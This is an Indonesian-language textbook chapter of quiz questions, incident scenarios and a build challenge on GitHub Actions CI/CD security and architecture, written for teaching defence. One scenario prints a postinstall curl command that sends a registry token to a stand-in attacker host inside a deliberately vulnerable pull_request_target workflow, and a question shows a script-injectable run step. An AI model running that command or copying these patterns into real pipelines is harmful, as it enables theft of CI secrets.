# BAB 08: Quiz, Challenge, & Knowledge Check
**GitHub Actions CI/CD & Automation**

---

## 1. Basic Questions (5 Soal Mendalam tentang Konsep Fundamental)

1. **Model Eksekusi dan Boundary Komponen**
   Jelaskan perbedaan mendasar antara *Workflow*, *Job*, dan *Step* ditinjau dari isolasi lingkungan eksekusi (runtime environment), alokasi komputasi (runner/VM/kontainer), dan siklus hidup (lifecycle). Mengapa variabel *environment* yang dideklarasikan di dalam sebuah *Step* tidak otomatis terbaca oleh *Step* lain tanpa manipulasi `$GITHUB_ENV`?

2. **Mekanisme Event Triggers dan Perbedaan `pull_request` vs `pull_request_target`**
   Uraikan perbedaan arsitektural dan konteks keamanan antara event `pull_request` dan `pull_request_target`. Dalam konteks referensi Git (`GITHUB_REF` dan `GITHUB_SHA`), branch mana yang di-checkout secara default oleh masing-masing event, dan apa implikasi keamanannya terhadap akses secret serta `GITHUB_TOKEN` pada public fork?

3. **Inter-Job Data Sharing vs Caching vs Artifacts**
   Bandingkan tiga mekanisme persistensi data di GitHub Actions:
   - Output/Needs parameter (`outputs` & `needs.<job_id>.outputs`)
   - `actions/cache`
   - `actions/upload-artifact` dan `actions/download-artifact`
   
   Jelaskan use-case yang tepat, durasi penyimpanan (retention), sifat immutability, dan batasan kapasitas untuk masing-masing mekanisme.

4. **Composite Actions vs Reusable Workflows**
   Kapan seorang arsitek sistem harus memilih *Composite Actions* dibandingkan *Reusable Workflows* (`workflow_call`)? Analisis batasan teknis keduanya dalam hal dukungan terhadap eksekusi multi-job, manajemen *secrets inheritance*, penggunaan `strategy.matrix`, dan overhead runtime initialization.

5. **Prinsip Least Privilege pada `GITHUB_TOKEN`**
   Secara default, GitHub Actions dapat mengekspos `GITHUB_TOKEN` dengan izin *read/write*. Jelaskan mengapa praktik ini berbahaya dari perspektif *Supply Chain Attack*. Tunjukkan bagaimana sintaks `permissions` di level workflow dan job harus dikonfigurasi untuk menerapkan prinsip *Least Privilege* pada skenario rilis (misalnya: rilis hanya butuh akses `contents: write` dan `id-token: write`).

---

## 2. Intermediate Questions (5 Soal Mekanisme Internal & Debugging)

1. **Troubleshooting Race Condition pada Concurrency Group**
   Diberikan konfigurasi berikut pada deployment workflow:
   ```yaml
   concurrency:
     group: production-deploy
     cancel-in-progress: true
   ```
   Jika Commit A sedang menjalankan proses migrasi database skema besar di langkah 3 dari 5, lalu Commit B di-push ke branch `main` sehingga Commit A dibatalkan secara instan (*killed mid-flight*), jelaskan dampak destruktif yang dapat terjadi pada state sistem target. Bagaimana arsitektur concurrency yang aman untuk deployment stateful?

2. **Injeksi Kode via Evaluasi Konteks Ekspresi (Script Injection)**
   Analisis celah keamanan kritis pada baris workflow berikut:
   ```yaml
   - name: Log Commit Message
     run: echo "Commit message is: ${{ github.event.head_commit.message }}"
   ```
   Bagaimana seorang penyerang dapat mengeksploitasi baris tersebut untuk melakukan *arbitrary command execution* dan mengekstrak repository secrets? Jelaskan perbaikan definitifnya menggunakan *intermediate environment variables*.

3. **Mekanisme Otentikasi OpenID Connect (OIDC) ke Cloud Provider**
   Jelaskan *handshake* internal OIDC antara GitHub Actions runner dan Cloud Provider (seperti AWS STS / GCP Workload Identity / Azure AD). Mengapa token OIDC (`id-token`) secara struktural jauh lebih aman daripada menyimpan long-lived static credentials (`AWS_ACCESS_KEY_ID` / `AWS_SECRET_ACCESS_KEY`) di GitHub Secrets?

4. **Matrix Strategy Edge Cases & Fail-Fast Mechanics**
   Pada workflow dengan matriks `3 OS x 4 Versi Node.js` (total 12 jobs), sebuah job pada kombinasi `ubuntu-latest / node-18` mengalami failure saat kompilasi. Jelaskan perilaku default dari parameter `fail-fast: true` terhadap 11 job lainnya yang sedang berjalan. Bagaimana cara merancang workflow agar semua job tetap berjalan sampai selesai untuk menghasilkan laporan testing agregat yang komprehensif tanpa menyembunyikan status kegagalan pipeline?

5. **Self-Hosted Runner Security: Ephemeral vs Persistent**
   Mengapa menjalankan workflow dari Public Repository pada Self-Hosted Runner berbasis *Persistent Virtual Machine* dianggap sebagai risiko keamanan tingkat kritis (*Critical Severity*)? Jelaskan konsep *Ephemeral Runners* berbasis kontainer (seperti Actions Runner Controller / ARC di Kubernetes) dan bagaimana mekanisme *post-job teardown* mencegah eskalasi privilege antar-eksekusi.

---

## 3. Scenario-Based Questions (3 Kasus Nyata Produksi)

### Skenario A: Runner Starvation & Cost Spike pada Monorepo Skala Besar
*Konteks Insiden:*
Sebuah perusahaan e-commerce memiliki Monorepo dengan 40 microservices. Workflow CI saat ini dikonfigurasi dengan:
```yaml
on:
  push:
    branches: [main]
  pull_request:
    branches: [main]
```
Setiap kali seorang engineer melakukan push ke branch PR mereka (meskipun hanya mengubah 1 baris CSS di `frontend-service`), seluruh 40 job test untuk 40 microservices dieksekusi secara paralel. Hal ini menyebabkan:
- Batas concurrency akun enterprise (500 parallel runners) habis (*runner starvation*), memblokir deployment hotfix tim lain.
- Tagihan GitHub-Hosted Runner bulanan melonjak 400%.
- Rata-rata waktu tunggu antrean (*queue time*) mencapai 55 menit.

*Pertanyaan Diagnostik & Arsitektur:*
1. Rancang arsitektur workflow CI menggunakan kombinasi native GitHub Actions `paths` filtering, workflow change detection (misalnya path-filtering via tool seperti `tj-actions/changed-files` atau engine monorepo native seperti Nx/Turborepo), dan dynamic matrix generation.
2. Bagaimana Anda tetap memastikan bahwa dependensi downstream antar-service yang terpengaruh ikut diuji tanpa menjalankan seluruh suite repositori?

---

### Skenario B: Race Condition & Out-of-Order Deployment pada Staging Server
*Konteks Masalah:*
Dua release engineer melakukan merge PR hampir bersamaan:
- **PR #101** (Fitur A) di-merge pada pukul 14:00:00 (Workflow Run #1)
- **PR #102** (Fitur B) di-merge pada pukul 14:00:15 (Workflow Run #2)

Workflow Run #1 memakan waktu 12 menit karena melakukan kompilasi aset berat. Workflow Run #2 memakan waktu 4 menit karena memanfaatkan cache lokal runner. Akibatnya:
- Workflow Run #2 selesai dan men-deploy Fitur B ke server Staging pada pukul 14:04:15.
- Workflow Run #1 selesai pada pukul 14:12:00 dan men-deploy Fitur A ke server Staging, secara tidak sengaja menimpa (downgrade) Fitur B yang sudah berjalan.

*Pertanyaan Diagnostik & Arsitektur:*
1. Mengapa native `concurrency` dengan `cancel-in-progress: false` berpotensi menyebabkan antrean menumpuk (*head-of-line blocking*) yang memperparah latensi deployment?
2. formulasikan arsitektur deployment pipeline yang menjamin linearitas eksekusi deployment (FIFO/LIFO yang terkontrol), validasi SHA commit terhadap target branch HEAD, dan implementasi deployment gates menggunakan GitHub Environments.

---

### Skenario C: Serangan "Pwn Request" via Fork Injection
*Konteks Eksploitasi:*
Repositori Open Source enterprise menggunakan workflow triage otomatis yang dipicu oleh kontributor luar:
```yaml
name: Triage & Build Fork PR
on:
  pull_request_target:
    types: [opened, synchronize]

jobs:
  build-and-preview:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - name: Setup & Build
        run: |
          npm install
          npm run build
        env:
          INTERNAL_REGISTRY_TOKEN: ${{ secrets.PROD_REGISTRY_PULL_TOKEN }}
```
Seorang peretas mengirimkan PR yang memodifikasi skrip `postinstall` di `package.json` untuk menjalankan `curl -X POST -d "$INTERNAL_REGISTRY_TOKEN" https://attacker.com/leak`. Seluruh access token berhasil dicuri dan digunakan untuk merusak artifak privat internal perusahaan.

*Pertanyaan Diagnostik & Arsitektur:*
1. Bedah secara anatomi mengapa kombinasi `pull_request_target` + `actions/checkout` dengan `ref: head.sha` + eksposur *Secrets* merupakan anti-pattern paling fatal di GitHub Actions.
2. Rancang solusi arsitektur remediation dua-tahap (*Two-Workflow Security Pattern*) menggunakan pemisahan:
   - Workflow unprivileged (`pull_request`) untuk build/test murni tanpa secrets.
   - Workflow privileged (`workflow_run`) yang hanya memproses artifak statis terverifikasi untuk deployment preview.

---

## 4. Chapter Challenge

### Tantangan Praktis: Enterprise Secure Multi-Tier Deployment Pipeline

#### Problem Statement
Anda ditugaskan merancang pipeline CI/CD produksi berstandar enterprise untuk aplikasi modular berbasis kontainer yang terdiri dari:
1. `service-core` (Golang)
2. `service-ui` (React)

Pipeline harus menjamin keamanan tingkat tinggi, isolasi secret, efisiensi eksekusi build, zero long-lived credentials, dan *zero-downtime rollback gate*.

#### Requirements
1. **Dynamic Path Execution**:
   - Perubahan hanya pada folder `src/core/**` hanya boleh memicu build/test untuk `service-core`.
   - Perubahan hanya pada folder `src/ui/**` hanya boleh memicu build/test untuk `service-ui`.
   - Perubahan pada `shared/**` atau root configurations harus memicu build untuk kedua service.
2. **Security & Zero Static Keys**:
   - `GITHUB_TOKEN` wajib dikonfigurasi *Least Privilege* (default: `contents: read`).
   - Otentikasi ke AWS ECR untuk push Docker image wajib menggunakan GitHub OIDC (`id-token: write`). Tidak boleh ada `AWS_ACCESS_KEY_ID` di GitHub Secrets.
   - Tidak ada injeksi konteks GitHub ekspresi `${{ ... }}` secara langsung di blok `run:`.
3. **Optimized Build & Cache**:
   - Implementasikan caching dependensi Go module dan npm modules dengan hash kunci yang deterministik.
   - Gunakan Docker Layer Caching (GitHub Cache backend atau Registry cache).
4. **Environment Deployment Gates & Rollback**:
   - Job deployment ke target `production` hanya berjalan jika branch adalah `main` dan dependensi build lolos.
   - Wajib menggunakan GitHub `environment: production` dengan proteksi concurrency grup yang mencegah tumpang-tindih deployment.
   - Tambahkan langkah health-check otomatis pasca-deploy. Jika health-check gagal, workflow harus memicu step *automatic rollback trigger* dan exit dengan status non-zero.

#### Constraints
- Workflow harus dideklarasikan dalam format valid GitHub Actions YAML (`.github/workflows/deploy.yml`).
- Gunakan *Reusable Workflow* atau *Composite Action* untuk standarisasi setup runtime (Node & Go).
- Seluruh file skrip pembantu (jika ada) harus di-pass melalui *environment variables*, bukan inline bash string interpolation.

#### Expected Output
1. File `.github/workflows/deploy.yml` yang memenuhi seluruh requirements secara sintaksis dan arsitektural.
2. Satu file Reusable Workflow/Composite Action (misalnya `.github/actions/setup-runtime/action.yml`) untuk enkapsulasi build toolchain.
3. Penjelasan arsitektur singkat (maksimum 300 kata) mengenai bagaimana pipeline ini menangani failure isolation dan menjamin integritas secret OIDC.

---

## 5. Knowledge Check & Checklist

Gunakan checklist ini untuk menguji kesiapan pemahaman konsep dan kapabilitas praktis Anda sebelum melangkah ke topik berikutnya.

### Saya harus memahami:
- [ ] Siklus hidup dan batasan isolasi antara Workflow, Job, dan Step.
- [ ] Perbedaan model keamanan antara event `pull_request`, `push`, `pull_request_target`, dan `workflow_run`.
- [ ] Mekanisme pertukaran token OIDC (OpenID Connect) dengan cloud identity provider tanpa long-lived keys.
- [ ] Vektor serangan *Script Injection* via GitHub Actions context expressions dan metode mitigasinya via environment mapping.
- [ ] Perbedaan trade-off performa dan keamanan antara GitHub-Hosted Runners dan Self-Hosted Runners (Ephemeral vs Persistent).
- [ ] Cara kerja Docker Layer Caching dan dependensi caching menggunakan `actions/cache`.
- [ ] Implikasi arsitektur dari parameter `concurrency` (queue vs cancel) pada migrasi database dan deployment stateful.

### Saya tidak perlu menghafal:
- [ ] Seluruh nomor versi spesifik dari actions pihak ketiga (cukup pahami penggunaan pin SHA rilis: `@v4` vs `@commit-sha`).
- [ ] Format JSON lengkap dari OIDC claims payload yang dikirimkan GitHub ke AWS/GCP (cukup pahami fungsi verifikasi `aud` dan `sub`).
- [ ] Detail sintaksis reguler expression kompleks untuk path-filtering pattern matching (bisa merujuk dokumentasi glob patterns GitHub).

### Saya harus bisa melakukan:
- [ ] Menulis workflow YAML dengan batasan `permissions` eksplisit di root dan job-level.
- [ ] Menghubungkan workflow GitHub Actions ke AWS/GCP/Azure menggunakan autentikasi OIDC murni.
- [ ] Melakukan debugging kegagalan job menggunakan SSH runner debug session (misalnya tmate/action-upterm) atau Runner Diagnostic Logging.
- [ ] Mengonfigurasi `strategy.matrix` tingkat lanjut dengan `include`, `exclude`, dan `max-parallel`.
- [ ] Mengisolasi eksekusi kode fork yang tidak tepercaya menggunakan *Two-Workflow Security Pattern*.
- [ ] Merancang pipeline deployment yang memanfaatkan GitHub Environments, Protected Branches, dan Manual Approval Rules.